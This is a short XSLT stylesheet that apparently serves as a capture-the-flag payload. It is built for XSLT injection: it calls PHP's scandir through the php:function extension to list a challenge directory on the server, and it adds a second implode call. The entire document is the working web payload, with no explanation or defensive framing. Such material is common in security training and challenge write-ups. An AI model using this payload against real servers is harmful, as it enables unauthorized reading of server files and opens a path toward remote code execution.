<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
PHP value=<xsl:value-of select="php:function('scandir','/challenge/web-serveur/ch50')"/>
PHP value2=<xsl:value-of select="php:function('implode',',','value')"/>
</xsl:template>
</xsl:stylesheet>
